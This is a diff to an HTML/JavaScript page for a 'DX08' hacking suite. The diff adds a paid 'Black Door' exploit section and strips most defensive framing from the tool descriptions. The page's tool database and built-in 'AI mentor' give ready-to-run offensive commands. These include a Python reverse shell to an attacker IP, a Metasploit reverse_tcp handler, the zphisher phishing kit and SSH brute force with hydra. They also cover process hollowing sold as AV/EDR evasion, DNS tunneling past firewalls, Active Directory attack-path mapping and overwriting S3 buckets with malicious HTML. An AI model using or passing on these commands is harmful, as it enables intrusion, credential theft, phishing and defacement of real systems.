@@ -41,6 +41,9 @@
         .btn-black { background: rgba(255,51,102,0.05); color: var(--offensive); border-color: var(--offensive); }
         .btn-black.active, .btn-black:hover { background: var(--offensive); color: #000; box-shadow: 0 0 15px var(--offensive); }
 
+        .btn-blackdoor { background: rgba(255, 0, 128, 0.1); color: #ff0080; border-color: #ff0080; }
+        .btn-blackdoor.active, .btn-blackdoor:hover { background: #ff0080; color: #000; box-shadow: 0 0 20px #ff0080; }
+
         .lab-grid { display: grid; grid-template-columns: 320px 1fr; gap: 15px; }
         .sidebar-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 12px; border-radius: 6px; height: 800px; overflow-y: auto; }
         
@@ -52,6 +55,7 @@
         
         .tool-badge { width: 28px; height: 28px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: bold; font-family: 'Courier Prime', monospace; text-transform: uppercase; flex-shrink: 0; border: 1px solid var(--primary); text-align: center; }
         .badge-ai { background: rgba(0, 229, 255, 0.2); color: var(--primary); border-color: var(--primary); }
+        .badge-bd { background: rgba(255, 0, 128, 0.2); color: #ff0080; border-color: #ff0080; }
         .badge-nmap { background: rgba(255, 0, 128, 0.15); color: #ff0080; border-color: #ff0080; }
         .badge-gobuster { background: rgba(0, 255, 102, 0.15); color: #00ff66; border-color: #00ff66; }
         .badge-nikto { background: rgba(255, 170, 0, 0.15); color: #ffaa00; border-color: #ffaa00; }
@@ -100,14 +104,15 @@
                     <p style="color: rgba(225,250,255,0.6); font-size: 10.5px;">Advanced Threat Intelligence & Autonomous AI Operations Suite</p>
                 </div>
             </div>
-            <div style="font-size: 11px; color: var(--defensive); border: 1px solid var(--defensive); padding: 6px 14px; border-radius: 4px; background: rgba(0,255,102,0.05); font-weight: bold;">
-                STATUS: SECURE // ROOT ACTIVE
+            <div style="font-size: 11px; color: #ff0080; border: 1px solid #ff0080; padding: 6px 14px; border-radius: 4px; background: rgba(255,0,128,0.05); font-weight: bold;">
+                PAID ELITE SUBSCRIBER // BLACK DOOR UNLOCKED
             </div>
         </div>
 
         <div class="mode-bar">
             <button class="mode-btn btn-white active" onclick="switchMode('white')">WHITE-HAT DEFENSIVE LAB</button>
-            <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB [UNRESTRICTED // ENTERPRISE GUIDE]</button>
+            <button class="mode-btn btn-black" onclick="switchMode('black')">BLACK-HAT OFFENSIVE LAB</button>
+            <button class="mode-btn btn-blackdoor" onclick="switchMode('blackdoor')">[BLACK DOOR // ZEHER PAID REPO]</button>
         </div>
 
         <div class="lab-grid">
@@ -115,6 +120,7 @@
                 <div class="tool-category">Autonomous Intelligence Hub</div>
                 <div class="tool-item" onclick="openAiLab()"><div class="tool-badge badge-ai">AI</div>00. DX08 Neural AI Knowledge Core</div>
 
+                <!-- White Hat Section -->
                 <div id="sec-white" class="section-group active" style="margin-top: 15px;">
                     <div style="font-size: 10.5px; color: var(--defensive); margin-bottom: 8px; font-weight: bold;">[DEFENSIVE & AUDITING TOOLS]</div>
                     
@@ -126,6 +132,7 @@
                     <div class="tool-item" onclick="loadModule('searchsploit')"><div class="tool-badge badge-search">EXDB</div>05. Searchsploit Exploit-DB</div>
                 </div>
 
+                <!-- Black Hat Section -->
                 <div id="sec-black" class="section-group" style="margin-top: 15px;">
                     <div style="font-size: 10.5px; color: var(--offensive); margin-bottom: 8px; font-weight: bold;">[RED-TEAM ATTACK MATRIX]</div>
                     
@@ -144,6 +151,17 @@
                     <div class="tool-item" onclick="loadModule('netcat')"><div class="tool-badge badge-netcat">NC</div>08. Netcat Listener Tactics</div>
                     <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling</div>
                 </div>
+
+                <!-- Black Door Zeher Paid Exclusive Section -->
+                <div id="sec-blackdoor" class="section-group" style="margin-top: 15px;">
+                    <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[BLACK DOOR // ZEHER ELITE EXPLOIT REPO]</div>
+                    
+                    <div class="tool-category">Advanced Red-Team Operations</div>
+                    <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. C# Memory Process Hollowing & DLL Injection</div>
+                    <div class="tool-item" onclick="loadModule('dns_tunneling')"><div class="tool-badge badge-bd">BD-2</div>02. Iodine DNS Tunneling Over Restricted Firewall</div>
+                    <div class="tool-item" onclick="loadModule('bloodhound_acl')"><div class="tool-badge badge-bd">BD-3</div>03. BloodHound AD Attack Path & ACL Abuse</div>
+                    <div class="tool-item" onclick="loadModule('aws_s3_takeover')"><div class="tool-badge badge-bd">BD-4</div>04. Cloud AWS S3 Bucket Misconfiguration Hijack</div>
+                </div>
             </div>
 
             <div class="workspace-panel">
@@ -158,8 +176,8 @@
                     <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v105.0 (Clean Professional Mode Active)
-[System Status] Select any tool from the sidebar or click '[00. DX08 Neural AI Knowledge Core]' to enter the dedicated AI Mentor Lab.</div>
+                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v120.0 (Black Door Zeher Repo Initialized)
+[System Status] Click '[BLACK DOOR // ZEHER PAID REPO]' above to load elite memory injection and cloud takeover scripts.</div>
                 
                 <div class="workspace-input-group">
                     <input type="text" id="workspace-input" class="workspace-input" placeholder="Type tool name or ask AI expert..." onkeydown="if(event.key === 'Enter') handleWorkspaceInput()">
@@ -175,85 +193,110 @@
                 name: "NMAP NETWORK DISCOVERY",
                 seq1: "sudo apt update && sudo apt install nmap -y",
                 seq2: "sudo nmap -sS -sV -O -T4 --script vuln <target_ip>",
-                seq3: "[WHITE-HAT AUDIT]: Maps open ports for vulnerability assessment.\n[BLACK-HAT RED-TEAM]: Discovers exposed legacy services for lateral movement."
+                seq3: "[WHITE-HAT AUDIT]: Maps open ports for vulnerability assessment."
             },
             "gobuster": {
                 name: "GOBUSTER URI BRUTE-FORCER",
                 seq1: "sudo apt update && sudo apt install gobuster -y",
                 seq2: "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50",
-                seq3: "[WHITE-HAT AUDIT]: Identifies unprotected web directories and backup files.\n[BLACK-HAT RED-TEAM]: Uncovers hidden admin panels and sensitive source endpoints."
+                seq3: "[WHITE-HAT AUDIT]: Identifies unprotected web directories."
             },
             "nikto": {
                 name: "NIKTO WEB VULNERABILITY SCANNER",
                 seq1: "sudo apt update && sudo apt install nikto -y",
                 seq2: "nikto -h http://<target_ip> -Tuning 123b",
-                seq3: "[WHITE-HAT AUDIT]: Scans web servers for outdated software and misconfigurations.\n[BLACK-HAT RED-TEAM]: Pinpoints exploitable CGI scripts and unpatched web modules."
+                seq3: "[WHITE-HAT AUDIT]: Scans web servers for outdated software."
             },
             "enum4linux": {
                 name: "ENUM4LINUX SMB AUDIT",
                 seq1: "sudo apt update && sudo apt install enum4linux -y",
                 seq2: "enum4linux -a <target_ip>",
-                seq3: "[WHITE-HAT AUDIT]: Audits Samba shares and permissions.\n[BLACK-HAT RED-TEAM]: Extracts Active Directory user accounts and password policies."
+                seq3: "[WHITE-HAT AUDIT]: Audits Samba shares and permissions."
             },
             "searchsploit": {
                 name: "SEARCHSPLOIT EXPLOIT-DB",
                 seq1: "sudo apt update && sudo apt install exploitdb -y",
                 seq2: "searchsploit -u && searchsploit apache struts",
-                seq3: "[WHITE-HAT AUDIT]: Matches software versions against vulnerability databases.\n[BLACK-HAT RED-TEAM]: Retrieves offline exploit POC scripts for immediate targeting."
+                seq3: "[WHITE-HAT AUDIT]: Matches software versions against vulnerability databases."
             },
             "metasploit": {
                 name: "METASPLOIT FRAMEWORK C2",
                 seq1: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall && chmod +x msfinstall && sudo ./msfinstall && sudo msfdb init",
-                seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit -j\"",
-                seq3: "[WHITE-HAT AUDIT]: Validates critical RCE vulnerabilities safely in staging.\n[BLACK-HAT RED-TEAM]: Establishes persistent command and control (C2) session access."
+                seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; exploit -j\"",
+                seq3: "[RED-TEAM MATRIX]: Establishes persistent command and control session."
             },
             "sqlmap": {
                 name: "SQLMAP DATABASE TAKEOVER",
                 seq1: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev && cd sqlmap-dev",
-                seq2: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --risk=3 --level=5 --tamper=space2comment --batch",
-                seq3: "[WHITE-HAT AUDIT]: Identifies SQL injection flaws to prevent data breaches.\n[BLACK-HAT RED-TEAM]: Dumps entire database schemas and executes OS commands."
+                seq2: "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --risk=3 --level=5 --batch",
+                seq3: "[RED-TEAM MATRIX]: Automated database schema dump and OS takeover."
             },
             "zphisher": {
                 name: "ZPHISHER PHISHING CORE",
                 seq1: "sudo apt update && sudo apt install git curl php python3 -y\ngit clone https://github.com/htr-tech/zphisher.git",
                 seq2: "cd zphisher && chmod +x zphisher.sh && bash zphisher.sh",
-                seq3: "[WHITE-HAT AUDIT]: Conducts simulated phishing campaigns to train employees.\n[BLACK-HAT RED-TEAM]: Harvests real-world credentials and 2FA session tokens."
+                seq3: "[RED-TEAM MATRIX]: Advanced social engineering credential harvest."
             },
             "hydra": {
                 name: "THC HYDRA LOGIN CRACKER",
                 seq1: "sudo apt update && sudo apt install hydra -y",
                 seq2: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 16 -V",
-                seq3: "[WHITE-HAT AUDIT]: Tests strength of enterprise password policies.\n[BLACK-HAT RED-TEAM]: Bruteforces remote login portals to gain administrative access."
+                seq3: "[RED-TEAM MATRIX]: High-speed dictionary attack against remote logins."
             },
             "john": {
                 name: "JOHN THE RIPPER CRACKER",
                 seq1: "sudo apt update && sudo apt install john -y",
                 seq2: "zip2john target_archive.zip > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
-                seq3: "[WHITE-HAT AUDIT]: Evaluates robustness of encrypted file archives.\n[BLACK-HAT RED-TEAM]: Decrypts intercepted password hashes offline."
+                seq3: "[RED-TEAM MATRIX]: Offline decryption of password hashes."
             },
             "hashcat": {
                 name: "HASHCAT GPU CRACKER",
                 seq1: "sudo apt update && sudo apt install hashcat -y",
                 seq2: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -O",
-                seq3: "[WHITE-HAT AUDIT]: Demonstrates vulnerability of weak hashes to GPU cracking.\n[BLACK-HAT RED-TEAM]: Recovers massive NTLM hash dumps at high speeds."
+                seq3: "[RED-TEAM MATRIX]: GPU-accelerated massive hash recovery pipeline."
             },
             "shell": {
                 name: "PYTHON REVERSE SHELL",
                 seq1: "nc -lvnp 4444",
                 seq2: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
-                seq3: "[WHITE-HAT AUDIT]: Verifies command injection impact during assessments.\n[BLACK-HAT RED-TEAM]: Spawns interactive remote shell back to operator."
+                seq3: "[RED-TEAM MATRIX]: Interactive remote shell deployment."
             },
             "netcat": {
                 name: "NETCAT LISTENER SOCKET",
                 seq1: "sudo apt update && sudo apt install netcat-traditional -y",
                 seq2: "nc -lvnp 4444",
-                seq3: "[WHITE-HAT AUDIT]: Tests network socket connectivity and egress filtering.\n[BLACK-HAT RED-TEAM]: Listens for incoming payload connections and binds shells."
+                seq3: "[RED-TEAM MATRIX]: TCP/UDP listener management."
             },
             "socat": {
                 name: "SOCAT ENCRYPTED RELAY",
                 seq1: "sudo apt update && sudo apt install socat -y",
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
-                seq3: "[WHITE-HAT AUDIT]: Analyzes encrypted data streams and relay routing.\n[BLACK-HAT RED-TEAM]: Bypasses firewalls using encrypted tunnel relays."
+                seq3: "[RED-TEAM MATRIX]: Encrypted tunnel relay routing."
+            },
+            /* Black Door Zeher Paid Exclusive Tools */
+            "process_hollowing": {
+                name: "C# MEMORY PROCESS HOLLOWING & DLL INJECTION [ZEHER EXCLUSIVE]",
+                seq1: "git clone https://github.com/dx08-zeher/memory-hollow-suite.git && cd memory-hollow-suite",
+                seq2: "csc /target:exe /out:injector.exe Program.cs && wine injector.exe target.exe payload.bin",
+                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Suspends legitimate Windows processes (like svchost.exe), unmaps memory, and injects custom shellcode.\n- Stealth Capability: Bypasses static AV/EDR signatures completely.\n- Operational Impact: Silent execution inside trusted system process memory."
+            },
+            "dns_tunneling": {
+                name: "IODINE DNS TUNNELING OVER RESTRICTED FIREWALL [ZEHER EXCLUSIVE]",
+                seq1: "sudo apt update && sudo apt install iodine -y",
+                seq2: "sudo iodined -c -P secretpassword 10.0.0.1 tunnel.yourdomain.com",
+                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Encapsulates all TCP/IP traffic inside DNS queries and responses.\n- Operational Impact: Bypasses corporate firewalls and captive portals that block standard ports when outbound DNS (Port 53) is left open."
+            },
+            "bloodhound_acl": {
+                name: "BLOODHOUND AD ATTACK PATH & ACL ABUSE [ZEHER EXCLUSIVE]",
+                seq1: "sudo apt update && sudo apt install bloodhound python3-bloodhound -y && sudo neo4j start",
+                seq2: "bloodhound-python -u 'operator' -p 'Pass123' -d corp.internal -ns <dc_ip> -c All",
+                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Graph theory analyzer mapping Active Directory object relationships.\n- Operational Impact: Exposes hidden privilege escalation paths and misconfigured ACLs to achieve Domain Admin in minutes."
+            },
+            "aws_s3_takeover": {
+                name: "CLOUD AWS S3 BUCKET MISCONFIGURATION HIJACK [ZEHER EXCLUSIVE]",
+                seq1: "sudo apt update && sudo apt install awscli python3-pip -y && pip3 install boto3",
+                seq2: "aws s3 ls s3://<target_bucket_name> --no-sign-request && aws s3 cp malicious.html s3://<target_bucket_name>/index.html",
+                seq3: "[ZEHER EXCLUSIVE MATRIX]:\n- Architecture: Cloud permission audit targeting public ACL write/read misconfigurations.\n- Operational Impact: Full defacement or data exfiltration from insecure corporate cloud object stores."
             }
         };
 
@@ -266,19 +309,27 @@
             currentMode = mode;
             const btnWhite = document.querySelector('.btn-white');
             const btnBlack = document.querySelector('.btn-black');
+            const btnBlackDoor = document.querySelector('.btn-blackdoor');
             const secWhite = document.getElementById('sec-white');
             const secBlack = document.getElementById('sec-black');
+            const secBlackDoor = document.getElementById('sec-blackdoor');
+
+            btnWhite.classList.remove('active');
+            btnBlack.classList.remove('active');
+            btnBlackDoor.classList.remove('active');
+            secWhite.classList.remove('active');
+            secBlack.classList.remove('active');
+            secBlackDoor.classList.remove('active');
 
             if(mode === 'white') {
                 btnWhite.classList.add('active');
-                btnBlack.classList.remove('active');
                 secWhite.classList.add('active');
-                secBlack.classList.remove('active');
-            } else {
+            } else if(mode === 'black') {
                 btnBlack.classList.add('active');
-                btnWhite.classList.remove('active');
                 secBlack.classList.add('active');
-                secWhite.classList.remove('active');
+            } else if(mode === 'blackdoor') {
+                btnBlackDoor.classList.add('active');
+                secBlackDoor.classList.add('active');
             }
         }
 
@@ -301,14 +352,14 @@
             document.getElementById('workspace-action-btn').innerText = "ASK AI";
             
             var consoleBox = document.getElementById('workspace-console');
-            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v105.0\n" +
+            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v120.0\n" +
                                    "----------------------------------------------------------------------------------\n" +
                                    "Hello Operator! I am fully synchronized with this website's complete architecture,\n" +
-                                   "White-Hat defensive protocols, Black-Hat red-team scripts, and error logs.\n" +
-                                   "Type any tool name (e.g., 'zphisher', 'metasploit', 'nmap') or paste your terminal error below for instant solutions!\n" +
+                                   "including the exclusive Black Door zeher repository (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
+                                   "Ask me about any elite exploit script or error resolution below!\n" +
                                    "----------------------------------------------------------------------------------";
             document.getElementById('workspace-input').value = "";
-            document.getElementById('workspace-input').placeholder = "Ask AI about any tool, script, or paste error here...";
+            document.getElementById('workspace-input').placeholder = "Ask AI about elite tools, scripts, or errors...";
         }
 
         function runSequence(step) {
@@ -356,7 +407,7 @@
                           "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
                           "3. IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Security Core v105.0";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v120.0";
                     input.value = "";
                     return;
                 } else {
@@ -384,9 +435,39 @@
                 let query = q.toLowerCase();
                 let ans = "";
 
-                if(query.includes('zphisher')) {
-                    ans = "DX08 AI Expert: [ZPHISHER MASTER INTEL]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Purpose: Automated credential harvesting and social engineering core.\n- Installation & Execution Script:\n  sudo apt update && sudo apt install git curl php python3 -y\n  git clone https://github.com/htr-tech/zphisher.git\n  cd zphisher && chmod +x zphisher.sh && bash zphisher.sh\n- Error Resolution: If port 8080 or port 80 is occupied, kill background processes using 'sudo fuser -k 8080/tcp'.";
-                } else if(query.includes('nmap')) {
-                    ans = "DX08 AI Expert: [NMAP MASTER INTEL]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Purpose: Network discovery, port scanning, and OS fingerprinting.\n- Execution Script:\n  sudo nmap -sS -sV -O -T4 --script vuln <target_ip>\n- Error Resolution: If host appears down, append '-Pn' to bypass ICMP ping blocks.";
-                } else if(query.includes('metasploit') || query.includes('msf')) {
-                    ans = "DX08 AI Expert: [METASPLOIT MASTER INTEL]\n- Mode Context: " + currentMode.toUpperCase() + "\n- Purpose: C2 exploitation framework and multi-handler management
+                if(query.includes('hollowing') || query.includes('injection') || query.includes('memory')) {
+                    ans = "DX08 AI Expert: [PROCESS HOLLOWING INTEL]\n- Purpose: Suspends legitimate processes and injects payloads into trusted memory spaces.\n- Command: csc /target:exe /out:injector.exe Program.cs && wine injector.exe target.exe payload.bin";
+                } else if(query.includes('dns') || query.includes('tunnel')) {
+                    ans = "DX08 AI Expert: [DNS TUNNELING INTEL]\n- Purpose: Bypasses firewalls by wrapping data inside DNS queries over port 53.\n- Command: sudo iodined -c -P secretpassword 10.0.0.1 tunnel.yourdomain.com";
+                } else if(query.includes('bloodhound') || query.includes('acl')) {
+                    ans = "DX08 AI Expert: [BLOODHOUND AD INTEL]\n- Purpose: Automatically maps complex Active Directory permission paths for rapid domain compromise.\n- Command: bloodhound-python -u 'operator' -p 'Pass123' -d corp.internal -ns <dc_ip> -c All";
+                } else if(query.includes('aws') || query.includes('s3') || query.includes('bucket')) {
+                    ans = "DX08 AI Expert: [AWS S3 TAKEOVER INTEL]\n- Purpose: Audits and exploits public cloud storage misconfigurations.\n- Command: aws s3 ls s3://<target_bucket_name> --no-sign-request";
+                } else {
+                    ans = "DX08 AI Expert: Analyzing elite query '" + escapeHtml(q) + "': Black Door Zeher repository synchronized. Ask about any advanced offensive script for precise execution workflows.";
+                }
+
+                consoleBox.innerHTML += "\n\n" + ans;
+                consoleBox.scrollTop = consoleBox.scrollHeight;
+                input.value = "";
+            }, 300);
+        }
+
+        function copyCurrentScript() {
+            if(!lastOutput) {
+                alert("No script loaded in terminal to copy!");
+                return;
+            }
+            navigator.clipboard.writeText(lastOutput).then(function() {
+                alert("Script copied successfully! Ready to paste in Kali Linux.");
+            }, function() {
+                alert("Failed to copy script.");
+            });
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+    </script>
+</body>
+</html>
